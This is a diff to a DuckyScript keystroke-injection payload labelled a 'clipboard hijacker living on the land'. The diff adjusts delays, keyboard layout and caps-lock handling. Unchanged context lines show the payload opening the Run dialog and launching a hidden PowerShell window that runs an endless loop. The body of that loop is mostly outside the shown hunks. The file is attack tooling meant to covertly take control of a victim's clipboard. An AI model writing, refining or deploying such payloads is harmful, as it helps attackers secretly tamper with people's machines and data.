@@ -1,6 +1,10 @@
-REM change to whatever keyboard layout you need
+REM Clipboard hijacker living on the land
+
+REM Change to your keyboard layout
 DUCKY_LANG NO
-DELAY 500 
+DELAY 800
+CAPSLOCK_DISABLE
+
 GUI r
 DELAY 300
 STRINGLN powershell -w h
@@ -49,3 +53,4 @@ while($true) {
     }
 }
 END_STRINGLN
+CAPSLOCK
